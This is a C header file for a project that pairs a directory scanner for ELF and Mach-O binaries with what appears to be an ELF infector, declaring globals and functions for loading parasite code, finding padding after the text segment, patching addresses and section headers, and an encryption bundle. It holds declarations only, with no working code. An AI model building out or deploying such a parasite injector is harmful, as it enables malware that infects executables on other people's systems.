#ifndef SEEKAT_H
# define SEEKAT_H

# include "color.h"
# include <stdio.h>
# include <dirent.h>
# include <unistd.h>
# include <sys/stat.h>
# include <sys/types.h>
# include <string.h>
# include <time.h>
# include <grp.h>
# include <pwd.h>
# include <sys/ioctl.h>
# include <sys/mman.h>
# include <sys/ptrace.h>
# include <signal.h>
# include <stdlib.h>
# include <fcntl.h>

# ifdef __linux__
 #include <elf.h>
# endif

# define MAGIC_ELF		"\x7f\x45\x4c\x46"
# define MAGIC_MACHO1	"\xfe\xed\xfa\xce"
# define MAGIC_MACHO2	"\xfe\xed\xfa\xcf"
# define MAGIC_MACHO3	"\xca\xfe\xba\xbe"
# define MAGIC_MACHO4	"\xce\xfa\xed\xfe"
# define MAGIC_MACHO5	"\xcf\xfa\xed\xfe"

// ############################################################
                           // WOODER
// ############################################################
int 		encr_bundle_size;			// size of decryption bundle
off_t		textafter;					  // offset of the segment just after .text segment
off_t		parasite_offset;			// Parasite entry point (if parasite is .so)
u_int64_t	parasite_size;			// Size of parasite
u_int64_t	parasite_full_size;	// Size of parasite including key size
int8_t		*parasite_code;			// Parasite residence (in memory before meeting its host)
// ############################################################

int		file_cpt;
int		dir_cpt;
int		elf_cpt;
int		macho_cpt;
int		exec_cpt;
int		so_cpt;

int		everyone;
int		only_elf;
int		only_macho;
int		only_exe;
int		only_so;
int		visual;

char	*message;

typedef struct	s_stock
{
	char	**dirt;
	char	**output;
	int		printname;
}				t_stock;

typedef struct	s_basiks
{
	int		max;
	int		nbobj;
	int		nbligne;
	int		lignemax;
}				t_basiks;

// ############################################################
                      // SEEKAT_DETECTOR
// ############################################################
char			**ft_dirdetector(int c, char **v);

// ############################################################
                        // SEEKAT_SONAR
// ############################################################
int				ft_sonar(t_stock *stock, int i);

// ############################################################
                       // SEEKAT_PRINTER
// ############################################################
void			ELF_handler(char *tmp);
int				ft_printer(t_stock *stock, int lvl);

// ############################################################
                        // SEEKAT_TOOLS
// ############################################################
char			*ft_ona(char *lol);
void			free_output(t_stock *stock);
void			free_dirt(t_stock *stock);
int				IsMachO(char *name);
int				IsSO_or_EXEC(char *name);
int				IsELF(char *name);
int				is_dir(char *name);
int				is_file(char *name);
int				is_truedir(char *test);
int				ft_islink(char *path, char **buf, int ret);
void			free_stock(t_stock *stock);

// ############################################################
                        // SEEKAT_FLAGS
// ############################################################
int				flagchecker(t_stock* stock);

// ############################################################
                           // WOODER
// ############################################################
int				file_checker(char *filename);

// ############################################################
                        // WOODER_TOOLS
// ############################################################
int				is_32or64ELF(void *ptr);
int				check_copy(char *ptr, size_t size);
void			ParasiteLoader(char *parasite_path);
int				error(char *whut);
void			AddrPatcher(u_int8_t *parasite, long placeholder, long address);

// ############################################################
                       // WOODER_64STUFF
// ############################################################
off_t			PaddingFinder_shdr_64(void *ptr);
off_t			PaddingSizeFinder_64_v2(void *ptr);
void			SHT_Patcher_64(void *ptr);

// ############################################################
                           // TOOLS
// ############################################################
void			set_signal_handle(int sig);
int				check_process(char *name, int pid);

#endif
